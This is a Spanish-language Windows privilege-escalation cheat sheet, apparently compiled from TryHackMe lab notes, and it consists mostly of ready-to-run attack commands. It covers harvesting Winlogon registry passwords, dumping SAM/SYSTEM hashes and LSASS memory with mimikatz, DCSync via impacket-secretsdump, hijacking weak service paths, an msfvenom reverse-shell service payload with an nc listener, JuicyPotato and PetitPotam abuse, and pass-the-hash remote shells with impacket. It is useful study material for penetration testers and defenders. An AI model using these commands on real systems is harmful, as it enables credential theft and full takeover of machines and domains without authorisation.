# Escalada de privilegios Windows

Técnicas usadas en **Chimichurri** y en las notas de TryHackMe.

Índice:

1. [Enumeración inicial](#1-enumeración-inicial)
2. [Credenciales guardadas en el registro](#2-credenciales-guardadas-en-el-registro)
3. [Volcar el SAM y el SYSTEM (hashes locales)](#3-volcar-el-sam-y-el-system-hashes-locales)
4. [Volcar credenciales con mimikatz (sekurlsa / lsadump)](#4-volcar-credenciales-con-mimikatz-sekurlsa--lsadump)
5. [Servicios: cuentas, estado y rutas débiles](#5-servicios-cuentas-estado-y-rutas-débiles)
6. [Reverse shell como servicio (msfvenom)](#6-reverse-shell-como-servicio-msfvenom)
7. [JuicyPotato (SeImpersonatePrivilege)](#7-juicypotato-seimpersonateprivilege)
8. [PetitPotam / PetitPotato (coerción NTLM)](#8-petitpotam--petitpotato-coerción-ntlm)
9. [Cambiar la contraseña de un usuario](#9-cambiar-la-contraseña-de-un-usuario)
10. [Acceso como administrador](#10-acceso-como-administrador)

## 1. Enumeración inicial

```
whoami
whoami /all        # grupos Y privilegios del token
whoami /groups
whoami /priv
hostname
systeminfo         # SO, arquitectura, dominio y patches
ipconfig /all      # interfaces, DNS y si hay dominio
set                # variables de entorno del usuario actual
net user
net user <usuario> /domain
net group "Domain Admins" /domain
net localgroup                   # grupos locales del equipo
net localgroup administrators   # quién es admin local
quser                            # sesiones abiertas (quién está conectado)
tasklist                         # procesos en ejecución
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"   # software instalado
```

Información del sistema y del dominio — ¿dónde he aterrizado?:

- `hostname` → nombre del equipo.
- `systeminfo` → SO, arquitectura, patches, si forma parte de un dominio y cuál (`Domain:`) o grupo de trabajo. Funciona como usuario normal, pero en equipos lentos tarda bastante.
- `ipconfig /all` → interfaces, dirección IP y servidor DNS (si el DNS apunta a un controlador de dominio, el equipo probablemente está unido a él).
- `set` → variables de entorno: de ahí salen `USERNAME`, `USERDOMAIN` (dominio o WORKGROUP), `USERPROFILE` y `COMPUTERNAME`.
- `net localgroup` → grupos locales; `net localgroup administrators` → miembros del grupo de administradores locales (quién tiene admin en este equipo).
- `quser` → quién tiene sesión abierta y en qué estado (`Active` = conectado, `Disc` = desconectado pero la sesión sigue viva).
- `tasklist` → procesos en ejecución; interesante para ver procesos de otros usuarios o servicios inusuales.
- `reg query ...Uninstall` → software instalado en el equipo: se anota nombre y versión para buscar vulnerabilidades conocidas (VLC, 7-Zip, etc. viejos).

Privilegios que abren la puerta a la escalada (los más interesantes de mirar con `whoami /all`):

- `SeImpersonatePrivilege` → un proceso puede hacerse pasar por el contexto de seguridad de otro usuario **después de autenticar**. Es el que usan los ataques "potato" (JuicyPotato, SweetPotato...).
- `SeAssignPrimaryTokenPrivilege` → permite asignar el token principal de otro usuario a un proceso nuevo. Se usa **junto a** `SeImpersonatePrivilege`.
- `SeBackupPrivilege` → lee cualquier archivo ignorando sus permisos. Sirve para volcar `SAM` y `SYSTEM` (y crackear las contraseñas localmente).
- `SeRestorePrivilege` → escribe en cualquier archivo o clave de registro ignorando permisos: sobrescribir ficheros críticos o claves para ganar SYSTEM.
- `SeDebugPrivilege` → adjuntar un depurador a cualquier proceso: volcar la memoria de **LSASS** (credenciales) o inyectar código en procesos privilegiados.
- `SeMachineAccountPrivilege` → crear cuentas de equipo en el dominio.

## 2. Credenciales guardadas en el registro

```
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

Consulta solo de un valor concreto (más limpia):

```
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```

- `/v <nombre>` → devuelve únicamente ese valor en vez de toda la clave.

Salida relevante:

```
DefaultUserName    REG_SZ    notadmin
DefaultPassword    REG_SZ    P@ssw0rd!
```

Con esas credenciales elevamos:

```
runas /user:<dominio>\<usuario> cmd.exe
```

## 3. Volcar el SAM y el SYSTEM (hashes locales)

Siendo administradores, copiamos fuera de la máquina el par de claves necesario para extraer los hashes NTLM de los usuarios locales. Requiere privilegios de admin (o `SeBackupPrivilege`).

En una shell de cmd:

```
reg save HKLM\SAM C:\Users\Administrator\Desktop\SAM
reg save HKLM\SYSTEM C:\Users\Administrator\Desktop\SYSTEM
```

- `reg save <clave> <archivo>` → vuelca una clave del registro a un fichero binario. Necesita administrador.
- `HKLM\SAM` → base de datos con los hashes de las contraseñas de las cuentas locales.
- `HKLM\SYSTEM` → contiene las claves con las que el SAM está cifrado; sin ella no se puede leer.

Extraemos los hashes con mimikatz (los dos ficheros deben estar en la máquina local, no en la remota). Primero habilitamos los privilegios de depuración, sin eso mimikatz no puede hacer casi nada:

```
privilege::debug
```

- `privilege::debug` → activa `SeDebugPrivilege` en el token del proceso actual. **Requiere estar como administrador** (o SYSTEM); si sale `ERROR code 5` es que no tienes suficientes privilegios.
- Es el primer paso típico de mimikatz; sin él, comandos como `lsadump`, `sekurlsa` o `token::elevation` fallarían.
- Con los ficheros ya volcados, `lsadump::sam` los lee en local y no lo exige, pero es costumbre ejecutarlo igualmente (y hará falta para cualquier comando sobre el sistema vivo).

A continuación volcamos el SAM:

```
lsadump::sam /sam:"C:\Users\Administrator\Desktop\SAM" /system:"C:\Users\Administrator\Desktop\SYSTEM"
```

- `lsadump::sam` → descifra el SAM con las claves del SYSTEM y lista `usuario:RID:lmhash:nthash`.
- El hash NT (NTLM) **no necesita crackearse**: se puede usar directamente con Pass-the-Hash (`evil-winrm --hashes`, `impacket-psexec -hashes`, `xfreerdp /pth`).

Para bajar los ficheros a Kali: `download SAM` y `download SYSTEM` (desde mimikatz o desde evil-winrm).

Alternativa sin mimikatz, desde Kali con los ficheros ya descargados:

```
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

Volcado remoto sin necesidad de shell en la máquina (vía SMB, con credenciales de admin):

```
impacket-secretsdump 'WRK/Administrator:N3w34829DJdd?1@10.220.10.20' -outputfile local_dump
```

- `impacket-secretsdump` → extrae los hashes directamente desde Kali: volcado local (`SAM`/`SYSTEM`), y si es un dominio también NTDS (usuarios del AD) y la caché LSA.
- Formato del objetivo: `[dominio/]usuario[:contraseña]@IP`. Aquí `WRK` es el workgroup (equipo sin dominio), `Administrator` el usuario y `10.220.10.20` la IP.
- `-outputfile local_dump` → guarda todo con ese prefijo en varios ficheros: `local_dump.sam` (hashes locales), `local_dump.ntds` (si hay dominio), `local_dump.system`, `local_dump.cachedcredentials`... Evita tener que copiar la salida de la terminal.
- Requiere credenciales de administrador en el objetivo. También admite hash en vez de contraseña: `-hashes :<hashNT>`, o Kerberos: `-k -no-pass` con un ticket en `KRB5CCNAME`.
- Salida: `dominio\usuario:rid:lmhash:nthash:::` — el hash NT sirve directamente para Pass-the-Hash.

Solo los hashes del dominio, por DCSync (sin tocar el SAM local ni copiar ficheros):

```
impacket-secretsdump TRYHACKME/drgonzo:lasvegas1@10.220.10.10 -just-dc -output dc_dump
```

- `-just-dc` → ejecuta un **DCSync**: le pide al controlador de dominio que replique las credenciales (como haría un DC nuevo), en vez de leer ficheros del disco. Ideal desde una shell con credenciales de dominio pero sin permisos de SYSTEM en el DC.
- `TRYHACKME/drgonzo:lasvegas1@10.220.10.10` → dominio, usuario y contraseña del DC (`10.220.10.10`).
- `-output dc_dump` → guarda el resultado en `dc_dump.ntds`.
- Resultado: hash NT de **todos** los usuarios del dominio, incluido el KRBTGT (con él se forjan tickets Golden) y los administradores de dominio.

## 4. Volcar credenciales con mimikatz (sekurlsa / lsadump)

Alternativa al volcado del SAM: en vez de sacar ficheros del registro, mimikatz lee directamente la memoria del proceso **LSASS**, que guarda las credenciales de las sesiones que se han logueado en la máquina. Requiere administrador.

```
privilege::debug
token::elevate
sekurlsa::logonpasswords
```

- `privilege::debug` → habilita `SeDebugPrivilege` para que mimikatz pueda leer y manipular la memoria de otros procesos. Es lo que hace falta para los volcados de LSASS (visto en la sección anterior).
- `token::elevate` → robamos el token de **SYSTEM** y seguimos ejecutándonos como la cuenta local más alta de Windows; así LSASS no nos cierra la puerta por privilegios de más nivel.
- `sekurlsa::logonpasswords` → lee las estructuras de credenciales de la memoria LSASS.

Resultado esperado: un volcado de **todas las sesiones de usuario** (actuales y recientes), incluidos nombres de usuario, dominios, hashes NTLM/SHA1 y cualquier contraseña de texto plano que LSASS haya guardado (típicamente de sesiones RDP, autologin o servicios con credenciales en claro con WDigest).

- Los hashes NTLM obtenidos sirven directamente para Pass-the-Hash, igual que los del SAM.
- Para forzar que salgan contraseñas en texto plano sin depender de la configuración de WDigest: `sekurlsa::wdigest` con `+` antes de la lista, o bien `sekurlsa::logonpasswords` tras modificar el registro `UseLogonCredential`.

Caché LSA de dominio (MSCacheV2), los hashes de inicio de sesión **fuera de línea** de un equipo unido a dominio:

```
lsadump::cache
```

- `lsadump::cache` → lee la caché LSA en disco (MSCacheV2). Esto nos da los secretos de inicio de sesión del usuario de dominio guardados para la autenticación sin conexión al DC.
- No hace falta contactar con el controlador de dominio: si el usuario se logueó en esta máquina, su hash está aquí (para crackearlo o para pasarlo a NTLMv1/v2). Para descifrarla necesita las claves bootkey, para eso se le puede pasar `/system` con el volcado de `HKLM\SYSTEM` de la sección anterior.

## 5. Servicios: cuentas, estado y rutas débiles

Listado de servicios y **la cuenta con la que corren**:

```
wmic service get Name,StartName
Get-WmiObject Win32_Service | select Name, StartName      # equivalente en PowerShell
```

- `StartName` → cuenta del servicio: `LocalSystem` = SYSTEM, `.\usuario` = cuenta local (si esa cuenta tiene contraseña conocida → escalada).

Estado de los servicios:

```
sc query state= all                            # todos los servicios con su estado
sc query state= all | find "DHCP"              # filtrar por nombre (cmd)
Get-Service | Where-Object {$_.Name -like "*DHCP*"}     # filtrar en PowerShell
```

- `state= all` → todos (por defecto `sc query` solo muestra los arrancados).
- Estado `RUNNING` / `STOPPED` → en marcha o parado.

Servicios con rutas débiles:

```
wmic service get name,pathname,startname | findstr /i "<nombre>"
icacls <archivo.bat>
```

Si la ruta del ejecutable **no está entre comillas** y contiene espacios, Windows ejecuta el primer binario que encuentre: basta con dejar ahí nuestro propio `.exe`. Ejemplo con `C:\Program Files\Al servicio\service.exe` → crear `C:\Program.exe`.

Otra vía: el directorio del servicio es **escritable por el usuario** (`icacls` lo confirma con `(W)`), así que sobrescribimos el binario directamente.

Comprobación y arreglo del atacante (si tenemos admin):

```
sc qc <servicio>              # binario, cuenta de arranque y modo de inicio
sc stop <servicio>            # pararlo antes de tocarlo
sc config <servicio> binPath= "C:\ruta\nuestra.exe"   # cambiar el binario (se ejecutará como la cuenta del servicio)
sc start <servicio>
```

- `sc qc` → muestra `SERVICE_START_NAME`: si es `LocalSystem`, al arrancar el servicio corremos como SYSTEM.
- `binPath=` lleva el **espacio después del igual**: es sintaxis obligatoria de `sc`.

## 6. Reverse shell como servicio (msfvenom)

Payload pensado para registrarse (o sustituir) un servicio, así que se ejecuta con la cuenta de ese servicio:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_LOCAL> LPORT=4444 -f exe-service -o svc.exe
```

- `-f exe-service` → el binario incluye la infraestructura de servicio (arranca/para con él). Si en vez de eso solo sobrescribimos el binario de un servicio existente, vale un exe normal (`-f exe`).

Escuchamos y lo lanzamos (por ejemplo cambiando el `binPath` de un servicio con `sc config`, sección anterior):

```
rlwrap nc -lvnp 4444
```

Si lo usamos como servicio nuevo:

```
sc create <servicio> binPath= "C:\ruta\svc.exe" start= auto
sc start <servicio>
```

## 7. JuicyPotato (SeImpersonatePrivilege)

Subimos el payload y [JuicyPotato](https://github.com/ohpe/juicy-potato) con `upload` de Evil-WinRM y lo ejecutamos:

```
JuicyPotato.exe -t * -p rs.exe -l 1678
```

- `-t *` → tipo de impersonación.
- `-p` → programa a lanzar **con el token de SYSTEM**.
- `-l` → puerto COM.

Errores típicos:

- `COM → recv failed with error: 10038` → fallo intermitente del componente COM: **reintentar**.
- Al funcionar aparece `[+] authresult 0 ... NT AUTHORITY\SYSTEM` y `[+] CreateProcessWithTokenW OK`.

## 8. PetitPotam / PetitPotato (coerción NTLM)

Otra vía para forzar autenticaciones y capturar el hash:

- [PetitPotato](https://github.com/wh0amitz/PetitPotato)
- [PetitPotam](https://github.com/topotam/PetitPotam)

PetitPotam obliga a un equipo a autenticarse (NTLM) contra un servidor que controlamos: es **coerción de autenticación**. Clásico en laboratorios: relayar ese NTLM hacia el DC y quedarse con el hash del máster para forjar tickets.

```
python3 PetitPotam.py <IP_atacante> <IP_objetivo>
```

- `<IP_atacante>` → escuchador NTLM (responder / ntlmrelayx).
- `<IP_objetivo>` → máquina que forzará la autenticación (un DC es lo interesante).
- Requiere una herramienta escuchando para capturar el NTLM; por sí solo no da la contraseña.

PetitPotato combina la coerción con la impersonación de servicio para ganar SYSTEM en local, sin relay:

```
PetitPotato.exe -relayServer <IP_atacante> -l 1678
```

## 9. Cambiar la contraseña de un usuario

```
net user <usuario> <nuevacontraseña>
net user <usuario> <nuevacontraseña> /domain
```

> Si devuelve *La contraseña no cumple con los requisitos de la directiva*, prueba con una más larga que tenga mayúsculas, minúsculas y números.

## 10. Acceso como administrador

Con contraseña:

```
evil-winrm -i <IP_o_dominio> -u Administrador -p '<contraseña>'
```

Con Pass-the-Hash (hash NT del volcado de SAM o DCSync):

```
impacket-psexec 'TRYHACKME/Administrator@10.220.10.10' -hashes :d71ee9fb6a3f54496bdc6c941f7a2903
```

### Shell remota con Impacket

Los cinco binarios de ejecución remota de Impacket comparten la misma forma de uso. En las instalaciones actuales se invocan como `impacket-<nombre>`; en las antiguas como `<nombre>.py`:

```
impacket-psexec   '<dominio>/<usuario>@<IP>'
impacket-wmiexec  '<dominio>/<usuario>@<IP>'
impacket-smbexec  '<dominio>/<usuario>@<IP>'
impacket-dcomexec '<dominio>/<usuario>@<IP>'
impacket-atexec   '<dominio>/<usuario>@<IP>'
```

- `impacket-psexec` → sube un servicio temporal (`PSEXESVC.exe`) en el objetivo y lanza la shell. La clásica; devuelve sesión **SYSTEM**, pero es la más detectada por el antivirus.
- `impacket-wmiexec` → ejecuta vía WMI: no instala nada en disco y deja menos rastro, pero corre **como el usuario** (no SYSTEM). Buen primer intento.
- `impacket-smbexec` → vía servicios + named pipes por SMB; no depende de WMI y da sesión **SYSTEM**. Muy fiable pero ruidosa (crea y borra servicios).
- `impacket-dcomexec` → como `wmiexec` pero usando DCOM (MMC20/ShellWindows): alternativa cuando WMI está filtrado o monitorizado.
- `impacket-atexec` → lanza el comando con el Planificador de tareas (`schtasks`) y borra la tarea después; ejecuta **como el usuario**, salida por fichero temporal.

Flags comunes a los cinco:

- `-hashes :<hashNT>` → Pass-the-Hash con el hash NTLM en vez de contraseña.
- `-k -no-pass` → autenticación Kerberos con el ticket del `KRB5CCNAME` (y `-dc-ip <IP_DC>` si el DNS no resuelve).
- `-share C$` / `-target-ip <IP>` → compartir o forzar la IP cuando hay varias interfaces.
- `shell` dentro de la sesión → consola interactiva; `Ctrl+C` o `exit` para salir.
